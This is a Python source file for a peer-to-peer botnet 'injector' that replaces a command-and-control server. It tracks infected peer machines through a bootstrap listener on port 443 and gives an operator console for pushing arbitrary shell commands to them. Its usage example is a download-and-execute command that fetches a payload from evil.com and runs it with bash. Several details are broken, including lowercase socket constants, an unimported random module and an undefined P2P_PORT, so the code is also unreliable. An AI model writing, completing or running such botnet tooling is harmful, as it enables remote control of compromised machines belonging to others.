# file: terminus_injector.py
# desc: the c2 is dead. long live the injector.

import socket
import threading
import json
import time
import uuid

class Injector:
    def __init__(self):
        self.known_peers = set()
        self.lock = threading.Lock()

    def handle_bootstrap(self, conn, addr):
        """a new seed is asking for entry. give it the addresses of its siblings."""
        print(f"[injector] bootstrap request from {addr[0]}")
        with self.lock:
            self.known_peers.add(addr[0])
            peer_list_for_new_node = list(self.known_peers - {addr[0]})
            conn.send(json.dumps(peer_list_for_new_node).encode())
        conn.close()

    def start_listener(self):
        """listens for new seeds asking to join the hive."""
        server = socket.socket(socket.af_inet, socket.sock_stream)
        server.bind(('0.0.0.0', 443))
        server.listen(10)
        print("[injector] listening for bootstrap requests on port 443...")
        while True:
            conn, addr = server.accept()
            # check if it's a bootstrap request
            # a real implementation would have a proper handshake
            threading.Thread(target=self.handle_bootstrap, args=(conn, addr)).start()

    def main_control(self):
        """the user interface for whispering to the hive."""
        print("--- terminus p2p injector ---")
        print("type 'inject <command>' to issue a task to the hive.")
        print("example: inject 'wget http://evil.com/payload.sh -o /tmp/p.sh && bash /tmp/p.sh'")
        
        while True:
            cmd_input = input("injector> ").strip()
            if cmd_input.startswith('inject '):
                command = cmd_input[7:]
                task = {
                    'id': str(uuid.uuid4()),
                    'cmd': command
                }
                task_json = json.dumps(task)

                with self.lock:
                    if not self.known_peers:
                        print("[!] no known peers to inject into. wait for a seed to connect.")
                        continue
                    # select a few random entry points into the hive
                    injection_points = random.sample(list(self.known_peers), k=min(3, len(self.known_peers)))
                
                print(f"[*] injecting task {task['id']} via {len(injection_points)} peers...")
                for peer_ip in injection_points:
                    try:
                        with socket.socket(socket.af_inet, socket.sock_stream) as s:
                            s.connect((peer_ip, P2P_PORT))
                            s.sendall(task_json.encode())
                    except Exception as e:
                        print(f"[!] failed to inject into {peer_ip}: {e}")

if __name__ == '__main__':
    injector = Injector()
    listener_thread = threading.Thread(target=injector.start_listener, daemon=True)
    listener_thread.start()
    injector.main_control()